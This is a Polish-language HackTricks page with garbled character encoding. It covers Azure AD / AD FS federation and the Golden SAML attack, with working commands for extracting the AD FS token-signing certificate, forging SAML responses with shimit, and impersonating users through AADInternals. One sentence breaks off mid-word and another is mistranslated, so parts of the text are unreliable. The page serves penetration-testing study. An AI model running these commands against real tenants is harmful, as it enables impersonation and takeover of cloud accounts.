# Federacja

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **repozytoriÃ³w GitHub**.

</details>

## Podstawowe informacje

[Z dokumentacji:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**Federacja** to zbiÃ³r **domen**, ktÃ³re ustanowiÅ‚y **zaufanie**. Poziom zaufania moÅ¼e siÄ™ rÃ³Å¼niÄ‡, ale zazwyczaj obejmuje **uwierzytelnianie**, a zawsze obejmuje **autoryzacjÄ™**. Typowa federacja moÅ¼e obejmowaÄ‡ **wiele organizacji**, ktÃ³re ustanowiÅ‚y **zaufanie** dla **wspÃ³lnego dostÄ™pu** do zestawu zasobÃ³w.

MoÅ¼esz **zafederowaÄ‡ swoje Å›rodowisko lokalne** z Azure AD i uÅ¼ywaÄ‡ tej federacji do uwierzytelniania i autoryzacji. Ta metoda logowania zapewnia, Å¼e caÅ‚e uwierzytelnianie uÅ¼ytkownika odbywa siÄ™ w Å›rodowisku lokalnym. Ta metoda pozwala administratorom wprowadziÄ‡ bardziej rygorystyczne poziomy kontroli dostÄ™pu. DostÄ™pna jest federacja z **AD FS** i PingFederate.

<figure><img src="../../../../.gitbook/assets/image (83) (1).png" alt=""><figcaption></figcaption></figure>

W federacji caÅ‚e **uwierzytelnianie** odbywa siÄ™ w Å›rodowisku **lokalnym**, a uÅ¼ytkownik korzysta z SSO we wszystkich zaufanych Å›rodowiskach. Dlatego uÅ¼ytkownicy mogÄ… **uzyskaÄ‡ dostÄ™p** do **aplikacji w chmurze**, korzystajÄ…c z ich **danych uwierzytelniajÄ…cych w Å›rodowisku lokalnym**.

**Security Assertion Markup Language (SAML)** jest uÅ¼ywany do **wymiany** wszystkich informacji dotyczÄ…cych uwierzytelniania i autoryzacji miÄ™dzy dostawcami.

W kaÅ¼dej konfiguracji federacji wystÄ™pujÄ… trzy strony:

* UÅ¼ytkownik lub klient
* Dostawca toÅ¼samoÅ›ci (IdP)
* Dostawca usÅ‚ug (SP)

(Obrazy pochodzÄ… z https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

1. PoczÄ…tkowo, uÅ¼ytkownik uzyskuje dostÄ™p do aplikacji (Dostawca UsÅ‚ug lub SP, takich jak konsola AWS lub klient sieciowy vSphere). Ten krok moÅ¼e zostaÄ‡ pominiÄ™ty, prowadzÄ…c klienta bezpoÅ›rednio do IdP (Dostawca ToÅ¼samoÅ›ci), w zaleÅ¼noÅ›ci od konkretnej implementacji.
2. NastÄ™pnie SP identyfikuje odpowiedniego IdP (np. AD FS, Okta) do uwierzytelniania uÅ¼ytkownika. NastÄ™pnie tworzy Å¼Ä…danie uwierzytelnienia SAML (Security Assertion Markup Language) i przekierowuje klienta do wybranego IdP.
3. IdP przejmuje kontrolÄ™, uwierzytelniajÄ…c uÅ¼ytkownika. Po uwierzytelnieniu IdP formuje odpowiedÅº SAML (SAMLResponse) i przekazuje jÄ… do SP przez uÅ¼ytkownika.
4. Na koniec SP ocenia odpowiedÅº SAML. JeÅ›li zostanie pomyÅ›lnie zweryfikowana, co oznacza relacjÄ™ zaufania z IdP, uÅ¼ytkownik otrzymuje dostÄ™p. To oznacza zakoÅ„czenie procesu logowania, umoÅ¼liwiajÄ…c uÅ¼ytkownikowi korzystanie z usÅ‚ugi.

**JeÅ›li chcesz dowiedzieÄ‡ siÄ™ wiÄ™cej o uwierzytelnianiu SAML i powszechnych atakach, przejdÅº do:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS to model toÅ¼samoÅ›ci oparty na twierdzeniach.
* "..twierdzeniasÄ…po prostu oÅ›wiadczeniami (na przykÅ‚ad nazwa, toÅ¼samoÅ›Ä‡, grupa), ktÃ³re sÄ… uÅ¼ywane gÅ‚Ã³wnie do autoryzacji dostÄ™pu do aplikacji opartych na twierdzeniach, znajdujÄ…cych siÄ™ w dowolnym miejscu w Internecie."
* Twierdzenia dla uÅ¼ytkownika sÄ… zapisane wewnÄ…trz tokenÃ³w SAML, a nastÄ™pnie sÄ… podpisane w celu zapewnienia poufnoÅ›ci przez IdP.
* UÅ¼ytkownik jest identyfikowany przez ImmutableID. Jest to globalnie unikalne i przechowywane w Azure AD.
* ImmutableID jest przechowywane w Å›rodowisku lokalnym jako ConsistencyGuid dla uÅ¼ytkownika i/lub moÅ¼e byÄ‡ wygenerowane na podstawie GUID uÅ¼ytkownika.
* WiÄ™cej informacji na stronie [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Atak Golden SAML:**

* W ADFS odpowiedÅº SAML jest podpisana przez certyfikat podpisywania tokenÃ³w.
* JeÅ›li certyfikat zostanie naruszony, moÅ¼liwe jest uwierzytelnienie w Azure AD jako DOWOLNY uÅ¼ytkownik zsynchronizowany z Azure AD!
* Podobnie jak w przypadku naduÅ¼ycia PTA, zmiana hasÅ‚a dla uÅ¼ytkownika lub MFA nie bÄ™dzie miaÅ‚a Å¼adnego efektu, poniewaÅ¼ faÅ‚szujemy odpowiedÅº uwierzytelniajÄ…cÄ….
* Certyfikat moÅ¼na wyodrÄ™bniÄ‡ z serwera AD FS z uprawnieniami DA, a nastÄ™pnie moÅ¼na go uÅ¼yÄ‡ z dowolnego poÅ‚Ä…czonego z Internetem komputera.
* WiÄ™cej informacji na stronie [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

Proces, w ktÃ³rym **Dostawca ToÅ¼samoÅ›ci (IdP)** generuje **SAMLResponse** w celu autoryzacji logowania uÅ¼ytkownika, jest kluczowy. W zaleÅ¼noÅ›ci od konkretnej implementacji IdP, odpowiedÅº moÅ¼e byÄ‡ podpisana lub zaszyfrowana za pomocÄ… prywatnego klucza IdP. Ten proces umoÅ¼liwia dostawcy usÅ‚ug (SP) potwierdzenie autentycznoÅ›ci SAMLResponse, zapewniajÄ…c, Å¼e zostaÅ‚ on rzeczywiÅ›cie wydany przez zaufanego IdP.

MoÅ¼na wyciÄ…gn
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Z caÅ‚ymi tymi informacjami moÅ¼liwe jest zapomnienie o prawidÅ‚owym SAMLResponse jako uÅ¼ytkownik, ktÃ³rego chcesz podszyÄ‡ siÄ™ za pomocÄ… [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (2).png" alt=""><figcaption></figcaption></figure>

### On-prem -> chmura
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Jest rÃ³wnieÅ¼ moÅ¼liwe utworzenie ImmutableID dla uÅ¼ytkownikÃ³w tylko w chmurze i podszywanie siÄ™ pod nich.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## OdnoÅ›niki

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
